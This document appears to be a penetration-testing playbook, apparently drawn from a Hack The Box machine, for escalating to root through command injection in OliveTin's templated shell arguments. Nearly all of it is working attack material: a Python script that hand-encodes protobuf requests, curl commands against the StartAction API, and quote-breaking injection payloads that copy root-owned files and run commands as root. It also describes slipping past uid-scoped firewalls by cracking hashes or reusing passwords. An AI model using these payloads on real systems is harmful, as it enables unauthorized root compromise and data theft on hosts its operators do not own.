# OliveTin templated-argument injection → root

**When to use:** A host runs OliveTin on localhost (default `127.0.0.1:1337`),
usually reachable only from a non-`www-data` uid, and its config has an
action of the form `shell: "... {{ arg }} ..."`. Any `arguments:` entry of
type `password` (or `ascii_identifier`/`int` where the value isn't strictly
validated) that lands inside a shell string is command injection in the
OliveTin service user's context — often **root**.

## Procedure

1. Read the config (e.g. via any file-read primitive):
   `grep -n -A20 'shell:' /etc/OliveTin/config.yaml`. Note the service user:
   `ps -o user,cmd -C OliveTin` (root = jackpot) and the listen address.
2. Reach the UI/API. If `curl http://127.0.0.1:1337/` times out from your
   current uid but works from another, suspect a firewall rule like
   `iptables -A OUTPUT -m owner --uid-owner www-data -p tcp --dport 1337 -j DROP`.
   Pivot to any other uid that *can* reach loopback (crack a local hash,
   reuse a password, `su -s /bin/bash -c '...' user`).
3. Find the API shape from the webui JS: it is **connect-web gRPC**. The
   call is `POST /api/olivetin.api.v1.<Service>/StartAction` with a
   `StartActionRequest { string actionId=1; repeated StartActionArgument
   arguments=2 { string name=1; string value=2; } }`.
4. **Critical:** if the JSON codec is disabled you get
   `{"code":"not_found","message":"action with ID  not found"}` (note the
   empty ID) for `Content-Type: application/json`, and `415` for
   `application/connect+json`. Send **binary protobuf** with
   `Content-Type: application/proto`:
   ```
   # actionId only: 0x0a <len> "backup_database"
   # each argument: 0x12 <outerlen> (0x0a <nlen> name) (0x12 <vlen> value)
   ```
   Easy with python:
   ```python
   fld=lambda f,b: bytes([f<<3|2,len(b)])+b
   s=lambda f,v: fld(f,v.encode())
   body = s(1,"backup_database") + b"".join(
       fld(2, s(1,n)+s(2,v))
       for n,v in [("db_user","backup_svc"),
                   ("db_pass","x' ; id > /tmp/oc_id 2>&1 ; #"),
                   ("db_name","production")])
   open("req.bin","wb").write(body)
   ```
   ```
   curl -s -X POST -H 'Content-Type: application/proto' \
     --data-binary @req.bin \
     http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction
   ```
5. Injection payload breaks out of the surrounding quote:
   `db_pass = x' ; cp /root/root.txt /tmp/r ; chmod 666 /tmp/r ; #`
   The trailing `#` comments out the rest of the original command line.
6. Read the result from the (now world-readable) output path.

## Simpler JSON route (verified on OliveTin 3000.10.0, HTB enigma)

There is also a plain-JSON REST front end at `POST /api/StartAction`
(Connect protocol) that works with `Content-Type: application/json` and
needs **no** protobuf hand-encoding. The field is `bindingId` (not
`actionId` — using `actionId` yields `{"code":"not_found","message":
"action with ID  not found"}` with an empty ID):

```bash
curl -s -X POST http://127.0.0.1:1337/api/StartAction \
  -H 'Content-Type: application/json' -d '{
    "bindingId":"backup_database",
    "arguments":[
      {"name":"db_user","value":"root"},
      {"name":"db_pass","value":"x'\'' ; cp /root/root.txt /tmp/r ; chmod 644 /tmp/r ; id > /tmp/whoami ; #"},
      {"name":"db_name","value":"production"}]}'
# -> {"executionTrackingId":"..."}  ; then cat /tmp/whoami -> uid=0(root)
```

`GET /api/GetActions` 404s (JS uses a different discovery path), but the
action's `id:` from `/etc/OliveTin/config.yaml` is the `bindingId` to use.

## Pitfalls

- The zone/validation types: only `password` (and sometimes free-text
  `int`/`url`) accept shell metacharacters; `ascii_identifier` rejects them.
- A **uid-scoped** firewall makes it look like the service is down; always
  test reachability from more than one uid before concluding.
- connect's unary JSON body may be silently ignored → empty `actionId`.
  If the JSON codec is absent, use `application/proto`.
- `authRequireGuestsToLogin: false` + `defaultPermissions: exec: true`
  means no auth is needed; if auth is on, capture an OliveTin session
  first.
